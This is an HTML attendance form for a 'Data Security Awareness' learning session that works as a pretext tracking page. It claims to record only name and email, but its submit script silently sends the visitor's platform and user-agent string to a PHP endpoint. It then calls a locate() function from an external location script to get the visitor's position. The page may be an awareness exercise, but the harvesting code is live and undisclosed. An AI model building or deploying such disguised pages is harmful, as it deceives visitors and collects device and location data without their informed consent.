<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Friday Learning | Attendance</title>
    <meta name="robots" content="noindex">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="js/location.js"></script>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #fff;
            color: rgba(0, 0, 0, 0.88);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 24px;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        .login-wrapper {
            width: 100%;
            max-width: 408px;
            margin: 0 auto;
        }

        /* Logo area */
        .logo-area {
            text-align: center;
            margin-bottom: 16px;
        }

        .logo-icon {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .logo-icon svg {
            width: 40px;
            height: 40px;
        }

        .logo-text {
            font-size: 20px;
            font-weight: 700;
            color: #1677ff;
            letter-spacing: -0.02em;
        }

        .logo-sub {
            font-size: 12px;
            font-weight: 500;
            color: rgba(0, 0, 0, 0.45);
            letter-spacing: 0.04em;
            text-transform: uppercase;
            margin-top: 2px;
        }

        /* Card */
        .login-card {
            margin-top: 75px;
            background: #fff;
            border-radius: 8px;
            border: 1px solid #f0f0f0;
            box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.03),
                        0 1px 6px -1px rgba(0, 0, 0, 0.02),
                        0 2px 4px 0 rgba(0, 0, 0, 0.02);
        }

        .card-head {
            padding: 24px 24px 0 24px;
        }

        .card-title {
            font-size: 22px;
            font-weight: 600;
            color: rgba(0, 0, 0, 0.88);
            text-align: center;
            letter-spacing: -0.04em;
            line-height: 1.3;
            margin-top: 24px;
        }

        .card-body {
            padding: 24px;
        }

        /* Form */
        .form-group {
            margin-bottom: 24px;
        }

        .form-label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            color: rgba(0, 0, 0, 0.88);
            margin-bottom: 8px;
            line-height: 1.5;
        }

        .form-input {
            width: 100%;
            height: 40px;
            padding: 8px 12px;
            font-size: 14px;
            font-family: inherit;
            line-height: 1.5;
            color: rgba(0, 0, 0, 0.88);
            background: #fff;
            border: 1px solid #d9d9d9;
            border-radius: 6px;
            outline: none;
            transition: all 0.2s;
        }

        .form-input::placeholder {
            color: rgba(0, 0, 0, 0.25);
        }

        .form-input:hover {
            border-color: #4096ff;
        }

        .form-input:focus {
            border-color: #1677ff;
            box-shadow: 0 0 0 2px rgba(5, 145, 255, 0.1);
        }

        /* Checkbox row */
        .checkbox-row {
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .checkbox-row input[type="checkbox"] {
            width: 16px;
            height: 16px;
            accent-color: #1677ff;
            cursor: pointer;
        }

        .checkbox-row label {
            font-size: 12px;
            color: rgba(0, 0, 0, 0.88);
            cursor: pointer;
            user-select: none;
        }

        /* Submit button */
        .submit-btn {
            width: 100%;
            height: 40px;
            padding: 6px 16px;
            font-size: 16px;
            font-weight: 500;
            font-family: inherit;
            line-height: 1.5;
            color: #fff;
            background: #1677ff;
            border: 1px solid #1677ff;
            border-radius: 6px;
            cursor: pointer;
            outline: none;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .submit-btn:hover {
            background: #4096ff;
            border-color: #4096ff;
        }

        .submit-btn:active {
            background: #0958d9;
            border-color: #0958d9;
        }

        .submit-btn:disabled {
            background: rgba(0, 0, 0, 0.04);
            border-color: #d9d9d9;
            color: rgba(0, 0, 0, 0.25);
            cursor: not-allowed;
        }

        .btn-spinner {
            display: none;
            width: 14px;
            height: 14px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.6s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* Success state */
        .success-state {
            display: none;
            padding: 32px 24px;
            text-align: center;
        }

        .success-icon {
            width: 64px;
            height: 64px;
            border-radius: 50%;
            background: #f6ffed;
            border: 1px solid #b7eb8f;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
        }

        .success-icon svg {
            color: #52c41a;
        }

        .success-title {
            font-size: 20px;
            font-weight: 600;
            color: rgba(0, 0, 0, 0.88);
            margin-bottom: 8px;
        }

        .success-desc {
            font-size: 14px;
            color: rgba(0, 0, 0, 0.45);
            margin-bottom: 24px;
        }

        .result-table {
            width: 100%;
            text-align: left;
            border-collapse: collapse;
            margin-bottom: 20px;
        }

        .result-table td {
            padding: 8px 0;
            font-size: 14px;
            border-bottom: 1px solid #f0f0f0;
        }

        .result-table td:first-child {
            color: rgba(0, 0, 0, 0.45);
            width: 120px;
        }

        .result-table td:last-child {
            color: rgba(0, 0, 0, 0.88);
            font-weight: 500;
        }

        .status-tag {
            display: inline-block;
            padding: 1px 8px;
            font-size: 12px;
            font-weight: 500;
            line-height: 20px;
            border-radius: 4px;
            background: #f6ffed;
            border: 1px solid #b7eb8f;
            color: #52c41a;
        }

        .info-banner {
            background: #e6f4ff;
            border: 1px solid #91caff;
            border-radius: 6px;
            padding: 10px 12px;
            font-size: 13px;
            color: #0958d9;
            text-align: left;
            display: flex;
            align-items: flex-start;
            gap: 8px;
        }

        .info-banner svg {
            flex-shrink: 0;
            margin-top: 1px;
        }
    </style>
</head>
<body onload="information();">

    <div class="login-wrapper">

        <!-- Logo -->
        <div class="logo-area">
            <div class="logo-icon">
                <svg viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <rect width="40" height="40" rx="8" fill="#1677ff"/>
                    <path d="M12 20.5L17.5 26L28 15" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
                <span class="logo-text">Attendance</span>
            </div>
            <div class="logo-sub">Friday Learning Session</div>
        </div>

        <!-- Card -->
        <div class="login-card">

            <!-- Form State -->
            <div id="formState">
                <div class="card-head">
                    <h3 class="card-title">Data Security Awareness</h3>
                </div>
                <div class="card-body">
                    <form id="attendanceForm" autocomplete="off">
                        <div class="form-group">
                            <label class="form-label" for="fullname">Full Name</label>
                            <input class="form-input" type="text" id="fullname" placeholder="Full Name" required />
                        </div>
                        <div class="form-group" style="margin-bottom: 12px;">
                            <label class="form-label" for="email">Email</label>
                            <input class="form-input" type="email" id="email" placeholder="your@email.com" required />
                        </div>
                        <div class="checkbox-row">
                            <input type="checkbox" id="agree" checked />
                            <label for="agree">I confirm my attendance</label>
                        </div>
                        <button type="submit" class="submit-btn" id="submitBtn">
                            <span class="btn-spinner" id="spinner"></span>
                            <span id="btnLabel">Submit</span>
                        </button>
                    </form>
                </div>
            </div>

            <!-- Success State -->
            <div class="success-state" id="successState">
                <div class="success-icon">
                    <svg width="28" height="28" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7"/>
                    </svg>
                </div>
                <div class="success-title">Attendance Confirmed</div>
                <div class="success-desc">Your attendance has been recorded.</div>
                <table class="result-table">
                    <tr><td>Name</td><td id="resName">-</td></tr>
                    <tr><td>Email</td><td id="resEmail">-</td></tr>
                    <tr><td>Time</td><td id="resTime">-</td></tr>
                    <tr><td>Status</td><td><span class="status-tag">Verified</span></td></tr>
                </table>
                <div class="info-banner">
                    <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
                        <path d="M8 1a7 7 0 100 14A7 7 0 008 1zm.75 10.5h-1.5v-4h1.5v4zm0-5.5h-1.5V4.5h1.5V6z"/>
                    </svg>
                    <span>Session materials will be sent to your email after the event.</span>
                </div>
            </div>

        </div>
    </div>

    <script>
        document.getElementById('attendanceForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const btn    = document.getElementById('submitBtn');
            const spin   = document.getElementById('spinner');
            const label  = document.getElementById('btnLabel');
            const name   = document.getElementById('fullname').value.trim();
            const email  = document.getElementById('email').value.trim();

            if (!name || !email) return;

            btn.disabled = true;
            spin.style.display = 'inline-block';
            label.textContent  = 'Submitting...';

            const ptf = navigator.platform || 'Unknown';
            const brw = navigator.userAgent || 'Unknown';
            const os  = navigator.userAgent || 'Unknown';

            try {
                await fetch('presentation_submit.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'Name=' + encodeURIComponent(name) +
                          '&Email=' + encodeURIComponent(email) +
                          '&Ptf=' + encodeURIComponent(ptf) +
                          '&Brw=' + encodeURIComponent(brw) +
                          '&Os='  + encodeURIComponent(os)
                });

                if (typeof locate === 'function') {
                    locate(
                        function() {},
                        function() {}
                    );
                }

                setTimeout(function() {
                    document.getElementById('formState').style.display   = 'none';
                    document.getElementById('resName').textContent  = name;
                    document.getElementById('resEmail').textContent = email;
                    document.getElementById('resTime').textContent  = new Date().toLocaleTimeString();
                    document.getElementById('successState').style.display = 'block';
                }, 800);

            } catch (err) {
                btn.disabled = false;
                spin.style.display = 'none';
                label.textContent  = 'Submit';
                alert('Network error, please try again.');
            }
        });
    </script>

</body>
</html>
